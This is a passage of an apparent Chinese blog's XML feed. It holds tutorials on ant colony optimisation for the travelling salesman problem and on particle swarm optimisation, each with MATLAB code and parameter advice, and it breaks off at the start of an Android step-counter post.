class="line">%-------------------------------------------------------------------------</span><br><span class="line">%% 迭代寻找最佳路径</span><br><span class="line">while iter &lt;&#x3D; iter_max</span><br><span class="line">    % 随机产生各个蚂蚁的起点城市</span><br><span class="line">      start &#x3D; zeros(m,1);</span><br><span class="line">      for i &#x3D; 1:m</span><br><span class="line">          temp &#x3D; randperm(n);</span><br><span class="line">          start(i) &#x3D; temp(1);</span><br><span class="line">      end</span><br><span class="line">      Table(:,1) &#x3D; start; </span><br><span class="line">      % 构建解空间</span><br><span class="line">      citys_index &#x3D; 1:n;</span><br><span class="line">      % 逐个蚂蚁路径选择</span><br><span class="line">      for i &#x3D; 1:m</span><br><span class="line">          % 逐个城市路径选择</span><br><span class="line">         for j &#x3D; 2:n</span><br><span class="line">             has_visited &#x3D; Table(i,1:(j - 1));           % 已访问的城市集合(禁忌表)</span><br><span class="line">             allow_index &#x3D; ~ismember(citys_index,has_visited);    % 参加说明1（程序底部）</span><br><span class="line">             allow &#x3D; citys_index(allow_index);  % 待访问的城市集合</span><br><span class="line">             P &#x3D; allow;</span><br><span class="line">             % 计算城市间转移概率</span><br><span class="line">             for k &#x3D; 1:length(allow)</span><br><span class="line">                 P(k) &#x3D; Tau(has_visited(end),allow(k))^alpha * Heu_F(has_visited(end),allow(k))^beta;</span><br><span class="line">             end</span><br><span class="line">             P &#x3D; P&#x2F;sum(P);</span><br><span class="line">             % 轮盘赌法选择下一个访问城市</span><br><span class="line">            Pc &#x3D; cumsum(P);     %参加说明2(程序底部)</span><br><span class="line">            target_index &#x3D; find(Pc &gt;&#x3D; rand);</span><br><span class="line">            target &#x3D; allow(target_index(1));</span><br><span class="line">            Table(i,j) &#x3D; target;</span><br><span class="line">         end</span><br><span class="line">      end</span><br><span class="line">      % 计算各个蚂蚁的路径距离</span><br><span class="line">      Length &#x3D; zeros(m,1);</span><br><span class="line">      for i &#x3D; 1:m</span><br><span class="line">          Route &#x3D; Table(i,:);</span><br><span class="line">          for j &#x3D; 1:(n - 1)</span><br><span class="line">              Length(i) &#x3D; Length(i) + D(Route(j),Route(j + 1));</span><br><span class="line">          end</span><br><span class="line">          Length(i) &#x3D; Length(i) + D(Route(n),Route(1));</span><br><span class="line">      end</span><br><span class="line">      % 计算最短路径距离及平均距离</span><br><span class="line">      if iter &#x3D;&#x3D; 1</span><br><span class="line">          [min_Length,min_index] &#x3D; min(Length);</span><br><span class="line">          Length_best(iter) &#x3D; min_Length;  </span><br><span class="line">          Length_ave(iter) &#x3D; mean(Length);</span><br><span class="line">          Route_best(iter,:) &#x3D; Table(min_index,:);</span><br><span class="line">          Limit_iter &#x3D; 1; </span><br><span class="line">          </span><br><span class="line">      else</span><br><span class="line">          [min_Length,min_index] &#x3D; min(Length);</span><br><span class="line">          Length_best(iter) &#x3D; min(Length_best(iter - 1),min_Length);</span><br><span class="line">          Length_ave(iter) &#x3D; mean(Length);</span><br><span class="line">          if Length_best(iter) &#x3D;&#x3D; min_Length</span><br><span class="line">              Route_best(iter,:) &#x3D; Table(min_index,:);</span><br><span class="line">              Limit_iter &#x3D; iter; </span><br><span class="line">          else</span><br><span class="line">              Route_best(iter,:) &#x3D; Route_best((iter-1),:);</span><br><span class="line">          end</span><br><span class="line">      end</span><br><span class="line">      % 更新信息素</span><br><span class="line">      Delta_Tau &#x3D; zeros(n,n);</span><br><span class="line">      % 逐个蚂蚁计算</span><br><span class="line">      for i &#x3D; 1:m</span><br><span class="line">          % 逐个城市计算</span><br><span class="line">          for j &#x3D; 1:(n - 1)</span><br><span class="line">              Delta_Tau(Table(i,j),Table(i,j+1)) &#x3D; Delta_Tau(Table(i,j),Table(i,j+1)) + Q&#x2F;Length(i);</span><br><span class="line">          end</span><br><span class="line">          Delta_Tau(Table(i,n),Table(i,1)) &#x3D; Delta_Tau(Table(i,n),Table(i,1)) + Q&#x2F;Length(i);</span><br><span class="line">      end</span><br><span class="line">      Tau &#x3D; (1-vol) * Tau + Delta_Tau;</span><br><span class="line">    % 迭代次数加1，清空路径记录表</span><br><span class="line">    iter &#x3D; iter + 1;</span><br><span class="line">    Table &#x3D; zeros(m,n);</span><br><span class="line">end</span><br><span class="line">%--------------------------------------------------------------------------</span><br><span class="line">%% 结果显示</span><br><span class="line">[Shortest_Length,index] &#x3D; min(Length_best);</span><br><span class="line">Shortest_Route &#x3D; Route_best(index,:);</span><br><span class="line">Time_Cost&#x3D;etime(clock,t0);</span><br><span class="line">disp([&#39;最短距离:&#39; num2str(Shortest_Length)]);</span><br><span class="line">disp([&#39;最短路径:&#39; num2str([Shortest_Route Shortest_Route(1)])]);</span><br><span class="line">disp([&#39;收敛迭代次数:&#39; num2str(Limit_iter)]);</span><br><span class="line">disp([&#39;程序执行时间:&#39; num2str(Time_Cost) &#39;秒&#39;]);</span><br><span class="line">%--------------------------------------------------------------------------</span><br><span class="line">%% 绘图</span><br><span class="line">figure(1)</span><br><span class="line">plot([citys(Shortest_Route,1);citys(Shortest_Route(1),1)],...  %三点省略符为Matlab续行符</span><br><span class="line">     [citys(Shortest_Route,2);citys(Shortest_Route(1),2)],&#39;o-&#39;);</span><br><span class="line">grid on</span><br><span class="line">for i &#x3D; 1:size(citys,1)</span><br><span class="line">    text(citys(i,1),citys(i,2),[&#39;   &#39; num2str(i)]);</span><br><span class="line">end</span><br><span class="line">text(citys(Shortest_Route(1),1),citys(Shortest_Route(1),2),&#39;       起点&#39;);</span><br><span class="line">text(citys(Shortest_Route(end),1),citys(Shortest_Route(end),2),&#39;       终点&#39;);</span><br><span class="line">xlabel(&#39;城市位置横坐标&#39;)</span><br><span class="line">ylabel(&#39;城市位置纵坐标&#39;)</span><br><span class="line">title([&#39;ACA最优化路径(最短距离:&#39; num2str(Shortest_Length) &#39;)&#39;])</span><br><span class="line">figure(2)</span><br><span class="line">plot(1:iter_max,Length_best,&#39;b&#39;)</span><br><span class="line">legend(&#39;最短距离&#39;)</span><br><span class="line">xlabel(&#39;迭代次数&#39;)</span><br><span class="line">ylabel(&#39;距离&#39;)</span><br><span class="line">title(&#39;算法收敛轨迹&#39;)</span><br><span class="line">%--------------------------------------------------------------------------</span><br><span class="line">%% 程序解释或说明</span><br><span class="line">% 1. ismember函数判断一个变量中的元素是否在另一个变量中出现，返回0-1矩阵；</span><br><span class="line">% 2. cumsum函数用于求变量中累加元素的和，如A&#x3D;[1, 2, 3, 4, 5], 那么cumsum(A)&#x3D;[1, 3, 6, 10, 15]。</span><br></pre></td></tr></table></figure><p>程序结果：</p><p><img data-src="https://pic3.superbed.cn/item/5cfbacba451253d178d93f65.png"></p><p><img data-src="https://pic3.superbed.cn/item/5cfbacbb451253d178d93f98.png"></p><h2 id="3-算法关键参数的设定"><a href="#3-算法关键参数的设定" class="headerlink" title="3.算法关键参数的设定"></a>3.算法关键参数的设定</h2><h4 id="1-参数设定的准则"><a href="#1-参数设定的准则" class="headerlink" title="1.参数设定的准则"></a>1.参数设定的准则</h4><ol><li>尽可能在全局上搜索最优解，保证解得最有型</li><li>算法尽快手链，以节省寻优时间</li><li>尽量反映客观存在的规律，以保证这种仿生算法的真实性</li></ol><h4 id="2-蚂蚁数量"><a href="#2-蚂蚁数量" class="headerlink" title="2.蚂蚁数量"></a>2.蚂蚁数量</h4><p>一般设置蚂蚁数量为城市数的1.5倍比较稳妥</p><h4 id="3-信息素因子"><a href="#3-信息素因子" class="headerlink" title="3.信息素因子"></a>3.信息素因子</h4><p> 信息素因素a反映蚂蚁在运动过程中所积累的信息量在知道蚁群搜索中的相对重要程度。<strong>当a∈[1,4]时</strong>，综合求解性能较好</p><h4 id="4-启发函数因子"><a href="#4-启发函数因子" class="headerlink" title="4.启发函数因子"></a>4.启发函数因子</h4><p>启发函数因子b，反映了启发式信息在知道蚁群搜索过程中的相对重要程度，其大小反映了蚁群巡游过程中小言行、确定性因素的作用强度。b过大是，蚂蚁在某个局部点上选择局优的可能性大。**b∈[3,4.5]**，综合求解性能较好。</p><h4 id="5-信息素挥发因子"><a href="#5-信息素挥发因子" class="headerlink" title="5.信息素挥发因子"></a>5.信息素挥发因子</h4><p> 信息素挥发因子ρ描述信息素的消失水平，而1-ρ则为信息素残留因子。<strong>ρ∈[0.2,0.5]时</strong>，综合求解能力较好</p><h4 id="6-最大迭代次数"><a href="#6-最大迭代次数" class="headerlink" title="6. 最大迭代次数"></a>6. 最大迭代次数</h4><p>一般去100-500</p><h4 id="7-组合参数设计策略"><a href="#7-组合参数设计策略" class="headerlink" title="7. 组合参数设计策略"></a>7. 组合参数设计策略</h4><p>可按照一下策略来进行参数的组合设计：</p><ol><li>确定蚂蚁数目，蚂蚁数目与城市规模之比约为1。5</li><li>参数粗调，即调整取值范围较大的a,b以及Q</li><li>参数微调，即调整取值范围较小的ρ</li></ol><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>蚁群算法有一下特点：</p><ol><li>从算法的性质而言，蚁群算法是在寻找一个比较好的局部最优解，而不是强调全局最优解</li><li>开始时算法收敛速度较快，在随后寻优过程中，迭代一定次数后，容易出现停滞现象</li><li>蚁群算法对TSP及相似问题具有良好的适应性，无论城市规模大还是小，都能进行有效地求解，而且求解速度相对较快</li><li>蚁群算法解得稳定性较差，及时参数不变，每次执行程序都有可能得到不同界，为此需要多执行几次，已寻找最佳解。</li><li>蚁群算法中有多个需要设定的参数，而且这些参数对程序又都有一定的影响，所以选择合适的参数组合在算法设计过程中也非常重要。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>粒子群算法（PSO)及MATLAB实现</title>
      <link href="/archives/302ae4cb.html"/>
      <url>/archives/302ae4cb.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-1-PSO算法的基础理论"><a href="#1-1-PSO算法的基础理论" class="headerlink" title="1.1 PSO算法的基础理论"></a>1.1 PSO算法的基础理论</h3><p>人们在决策过程中常常会综合两种重要的信息：第一种是他们自己的经验，第二种是其他人的经验。</p><p>同样的道理，群鸟在觅食过程中，每只鸟的初始状态都是出于随机位置，且飞翔的方向也是随机的。但是随着时间的推移这些初始处于随机位置的鸟类通过群内相互学习、信息共享和个体不断积累觅食的经验，自发组织积聚成一个群落。每只鸟能够记住自己找到的最好的位置，称之为局部最优。此外，还能够记住群鸟中所有个体索恩能够找到的最好位置，称为全局最优，整个鸟群的觅食中心都是去向全局最优移动的，这在生物学中称为“同步效应”。</p><p>在群鸟觅食模型中，每个个体都可以被看成是一个例子，鸟群则被看成一个粒子群。设在一个$D$维的目标空间里，有$m$个粒子组成的群里，其中第$i$个粒子的位置表示为$X_i$，即第$i$个粒子在$D$维搜索空间的位置是$Xi$。换言之，每个粒子的位置就是一个潜在解，将$Xi$带入目标函数就可以计算出其适应值，根据适应值的大小衡量其优劣，粒子个体经历过的最好位置记为$Pi$，整个群体所有粒子经历过的最好位置记为$Pg$。粒子$i$的速度记为$Vi$。</p><a id="more"></a><p>粒子群算法采用下列公式对粒子所在的位置不断更新（单位时间为1）：</p><p>$$<br>vi = w \times vi + c1 \times r1 \times (pi-xi)+c2 \times r2 \times (pg-xi)<br>$$</p><p>$$<br>xi = xi+a \times vi<br>$$</p><ul><li>$w$ 为非负数，称为惯性因子</li><li>$c1$和$c2$称为加速常数。$c1$是根据个体自身的经验进行判断的常数；$c2$根据群体的经验</li><li>$r1$和$r2$为$[0，1]$范围内变换的随机数</li><li>$a$ 称为约束因子，目的是控制速度的权重</li><li>$vi$ 即粒子$i$的飞翔速度$Vi$被一个最大速度$Vmax$所限制。如果当前时刻粒子在某纬度的速度$Vi$更新后超过该纬度的最大飞翔速度$Vmax$，则当前时刻该纬度被限制为$Vmax$。</li></ul><p>迭代终止条件根据具体问题设定，一般为达到预定迭代次数或者粒子群目前为止搜索到最有位置满足目标函数的最小容许误差。</p><h3 id="1-2-PSO算法的约束优化"><a href="#1-2-PSO算法的约束优化" class="headerlink" title="1.2 PSO算法的约束优化"></a>1.2 PSO算法的约束优化</h3><p>原则上$PSO$适应于非约束的优化问题。近年来，一些学者将其推广到约束优化问题，其关键在于如何处理好约束。基于$PSO$算法约束优化工作主要分为两类。</p><ol><li>罚函数法。罚函数的目的是将约束优化问题转化为无约束优化问题</li><li>将粒子群的搜索范围都限制在条件约束族中、</li></ol><p>但是目前有关运用$PSO$算法来处理多约束优化问题的理论还不成熟。</p><h3 id="1-3-PSO的优缺点"><a href="#1-3-PSO的优缺点" class="headerlink" title="1.3 PSO的优缺点"></a>1.3 PSO的优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ol><li>不依赖与问题信息，采用实数求解，算法通用性强。</li><li>需要调整的参数少，原理简单，容易实现，这是PSO的最大优点</li><li>协同搜索，同时利用个体局部信息和群体全局信息进行指导搜索。</li><li>收敛速度快</li><li>更容易飞跃局部最优信息。</li></ol><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ol><li>算法局部搜索能力较差，搜索精度不高。</li><li>算法不能保证搜索到全局最优解，主要有一下两个方面：<ol><li>有时粒子群在俯冲过程中会错失全局最优解。</li><li>应用PSO算法处理高位复杂问题是，算法可能过早收敛。</li></ol></li><li>反酸搜索性能对参数具有一定的依赖性</li><li>PSO算法是一种概率算法</li><li>欠缺的生物学背景</li></ol><h2 id="2-PSO算法程序设计"><a href="#2-PSO算法程序设计" class="headerlink" title="2. PSO算法程序设计"></a>2. PSO算法程序设计</h2><h3 id="2-1-程序设计流程"><a href="#2-1-程序设计流程" class="headerlink" title="2.1 程序设计流程"></a>2.1 程序设计流程</h3><ol><li>初始化相关参数</li><li>评价每个粒子的初始适应值</li><li>将初始适应值作为当前每个粒子的最优值，并记录当前的位置作为局部最优位置。</li><li>将最佳初始适应值作为当前全局最优值，并记录当前位置。</li><li>依据上文提到的计算速度和位置公式进行计算。这里要注意最大速度限幅度处理。</li><li>比较当前适应值与之前的适应值，如果更优则进行更新。</li><li>找到当前粒子群的全局最优</li><li>重复5-7步知道达到最小误差或者达到最优大迭代次数。</li><li>输出</li></ol><h3 id="2-2-PSO算法的参数选取"><a href="#2-2-PSO算法的参数选取" class="headerlink" title="2.2 PSO算法的参数选取"></a>2.2 PSO算法的参数选取</h3><h4 id="参数1-粒子数"><a href="#参数1-粒子数" class="headerlink" title="参数1  粒子数"></a>参数1  粒子数</h4><p>粒子数一般取值$20-40$,实验表明，对于大多数$30$个粒子就够用了。粒子数量越多没搜索范围越大，越容易找到全局最优解，但是程序运行时间越长。</p><h4 id="参数2-惯性因子"><a href="#参数2-惯性因子" class="headerlink" title="参数2 惯性因子"></a>参数2 惯性因子</h4><p>惯性因子$w$对于粒子群算法的收敛性起到很大作用，$w$值越大，粒子飞翔幅度越大，容易错失局部寻优能力，而全局搜索能力越强；反之，则局部能力越强，全局弱。这里需要注意一个误区：认为惯性因子越大则继承当前飞翔速度也就越大，所以应该是较小程度地离开原先的寻优轨道。错误理解的原因是，$w$越大，粒子飞翔的速度和位置更新的幅度也就越大，因此偏离原先原先寻优轨道的程度也就越大。（和中学的学习的加速度对速度理解类似？？）</p><p>通常的做法是在迭代开始时讲惯性因子设置得较大，然后在迭代过程中逐步减小。$w$的取值是$[0 1]$，如果$w$取定值，那么建议取$0.6-0.75$.</p><h4 id="参数3-加速常熟-c1-和-c2"><a href="#参数3-加速常熟-c1-和-c2" class="headerlink" title="参数3 加速常熟$c1$和$c2$"></a>参数3 加速常熟$c1$和$c2$</h4><p>一般情况下$c1$= $c2$=$2$.$0$。目前对于加速常数$c1$和$c2$的确切取值，学术界有较大的分歧。</p><p>其中：</p><ul><li>$c1$ 代表自身经验</li><li>$c2$ 代表群体经验</li></ul><h4 id="参数4-最大飞翔速度-Vmax"><a href="#参数4-最大飞翔速度-Vmax" class="headerlink" title="参数4 最大飞翔速度$Vmax$"></a>参数4 最大飞翔速度$Vmax$</h4><p>粒子群算法是通过调整每一次迭代时每一个粒子在每一维上移动一定的距离进行的，速度的改变是随机的，而不希望不收控制的粒子搜索轨道被扩展到问题空间越来越广阔的距离，并达到无穷。如果要粒子进行有效的搜索，就必须对参数$Vmax$进行限制。参数$Vmax$有利于防止搜索范围毫无意义的发散。关于$Vmax$的确定，需要有一定的先验。为了跳出局部最优，需要较大的寻优补偿，而在接近最优值时，采用更小的步长会更好。如果$Vmax$不变，通常设置为没维变化范围的$10$%$-20$%</p><h3 id="2-3-PSO算法MATLAB实现例题"><a href="#2-3-PSO算法MATLAB实现例题" class="headerlink" title="2.3 PSO算法MATLAB实现例题"></a>2.3 PSO算法MATLAB实现例题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">clc;</span><br><span class="line">clear;</span><br><span class="line">close all;</span><br><span class="line">tic;                              %程序运行计时</span><br><span class="line">E0=<span class="number">0.001</span>;                        %允许误差</span><br><span class="line">MaxNum=<span class="number">100</span>;                    %粒子最大迭代次数</span><br><span class="line">narvs=<span class="number">1</span>;                         %目标函数的自变量个数</span><br><span class="line">particlesize=<span class="number">30</span>;                    %粒子群规模</span><br><span class="line">c1=<span class="number">2</span>;                            %每个粒子的个体学习因子，也称为加速常数</span><br><span class="line">c2=<span class="number">2</span>;                            %每个粒子的社会学习因子，也称为加速常数</span><br><span class="line">w=<span class="number">0.6</span>;                           %惯性因子</span><br><span class="line">vmax=<span class="number">0.8</span>;                        %粒子的最大飞翔速度</span><br><span class="line">x=<span class="number">-5</span>+<span class="number">10</span>*rand(particlesize,narvs);     %粒子所在的位置</span><br><span class="line">v=<span class="number">2</span>*rand(particlesize,narvs);         %粒子的飞翔速度</span><br><span class="line">fitness = @(x)(<span class="number">1</span>/(<span class="number">1</span>+(<span class="number">2.1</span>*(<span class="number">1</span>-x+<span class="number">2</span>*x.^<span class="number">2</span>).*<span class="built_in">exp</span>(-x.^<span class="number">2</span>/<span class="number">2</span>))));%定义适应度函数</span><br><span class="line">f = zeros(<span class="number">1</span>,particlesize);      % 预分配</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>:particlesize</span><br><span class="line">    <span class="keyword">for</span> j=<span class="number">1</span>:narvs</span><br><span class="line">        f(i)=fitness(x(i,j));</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">personalbest_x=x;</span><br><span class="line">personalbest_faval=f;</span><br><span class="line">[globalbest_faval,i]=min(personalbest_faval);</span><br><span class="line">globalbest_x=personalbest_x(i,:);</span><br><span class="line">k=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> k&lt;=MaxNum</span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span>:particlesize</span><br><span class="line">        <span class="keyword">for</span> j=<span class="number">1</span>:narvs</span><br><span class="line">            f(i)=fitness(x(i,j));</span><br><span class="line">        end</span><br><span class="line">        if f(i)&lt;personalbest_faval(i) %判断当前位置是否是历史上最佳位置</span><br><span class="line">            personalbest_faval(i)=f(i);</span><br><span class="line">            personalbest_x(i,:)=x(i,:);</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    [globalbest_faval,i]=min(personalbest_faval);</span><br><span class="line">    globalbest_x=personalbest_x(i,:);</span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span>:particlesize %更新粒子群里每个个体的最新位置</span><br><span class="line">        v(i,:)=w*v(i,:)+c1*rand*(personalbest_x(i,:)-x(i,:))...</span><br><span class="line">            +c2*rand*(globalbest_x-x(i,:));</span><br><span class="line">        <span class="keyword">for</span> j=<span class="number">1</span>:narvs    %判断粒子的飞翔速度是否超过了最大飞翔速度</span><br><span class="line">            <span class="keyword">if</span> v(i,j)&gt;vmax</span><br><span class="line">                v(i,j)=vmax;</span><br><span class="line">            elseif v(i,j)&lt;-vmax</span><br><span class="line">                v(i,j)=-vmax;</span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">        x(i,:)=x(i,:)+v(i,:);</span><br><span class="line">    end</span><br><span class="line">    if abs(globalbest_faval)&lt;E0,break,end</span><br><span class="line">    k=k+<span class="number">1</span>;</span><br><span class="line">end</span><br><span class="line">Value1=<span class="number">1</span>/globalbest_faval<span class="number">-1</span>; Value1=num2str(Value1);</span><br><span class="line">% <span class="built_in">strcat</span>指令可以实现字符的组合输出</span><br><span class="line">disp(strcat(&#x27;the maximum value&#x27;,&#x27;=&#x27;,Value1));</span><br><span class="line">%输出最大值所在的横坐标位置</span><br><span class="line">Value2=globalbest_x; Value2=num2str(Value2);</span><br><span class="line">disp(strcat(&#x27;the corresponding coordinate&#x27;,&#x27;=&#x27;,Value2));</span><br><span class="line">x=<span class="number">-5</span>:<span class="number">0.01</span>:<span class="number">5</span>;</span><br><span class="line">y=<span class="number">2.1</span>*(<span class="number">1</span>-x+<span class="number">2</span>*x.^<span class="number">2</span>).*<span class="built_in">exp</span>(-x.^<span class="number">2</span>/<span class="number">2</span>);</span><br><span class="line">plot(x,y,&#x27;m-&#x27;,&#x27;linewidth&#x27;,3);</span><br><span class="line">hold on;</span><br><span class="line">plot(globalbest_x,1/globalbest_faval-1,&#x27;kp&#x27;,&#x27;linewidth&#x27;,4);</span><br><span class="line">legend(&#x27;目标函数&#x27;,&#x27;搜索到的最大值&#x27;);</span><br><span class="line">xlabel(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">ylabel(<span class="string">&#x27;y&#x27;</span>);</span><br><span class="line">grid on;</span><br><span class="line">toc;</span><br></pre></td></tr></table></figure><p>程序输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">the maximum value&#x3D;5.1985</span><br><span class="line">the corresponding coordinate&#x3D;-1.1617</span><br><span class="line">时间已过 0.250482 秒。</span><br><span class="line">&gt;&gt; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android计步代码</title>
      <link href="/archives/f7aeb3e0.html"/>
      <url>/archives/f7aeb3e0.html</url>
      
        <content type="html"><![CDATA[<p>##前言</p><blockquote><p>Android端计步代码，经测试较为精准。使用了计步传感器（耗能低，准确度高）和加速度传感器（适用度广，基本上各个手机上都有这个传感器），<strong>代码中牵涉到数据的操作，数据库我使用的是GreenDao，相关代码就不贴了，因为配置一下就好了，毕竟重在计步嘛</strong></p></blockquote><p>主要使用到的技术：</p><ul><li>传感器的使用</li><li>广播监听</li><li>计时类</li><li>常驻通知</li><li>使用Messenger进行跨进程通信</li><li>计步算法<a id="more"></a>效果图</li></ul><p><img data-src="https://pic3.superbed.cn/item/5cfbacb0451253d178d93e9b.gif" alt="计步变化"></p><p>实物不好拍摄，就直接录了个GIF，实际用着还是不错的。</p><p>##废话不多说，直接上代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span 